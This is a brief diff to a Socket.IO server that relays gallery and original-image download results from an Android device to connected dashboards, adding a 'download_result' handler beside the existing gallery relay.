@@ -68,10 +68,16 @@ io.on('connection', (socket) => {
     }
   });
 
-  // Gallery relay: Android sends gallery_result -> forward to all dashboards
+  // Gallery relay
   socket.on('gallery_result', (data) => {
     console.log(`Gallery received from device: ${data.id}`);
     io.emit('gallery_result', data);
+  });
+
+  // Original image download relay
+  socket.on('download_result', (data) => {
+    console.log(`Download ready: ${data.name} (${data.id})`);
+    io.emit('download_result', data);
   });
 
   socket.on('disconnect', () => {
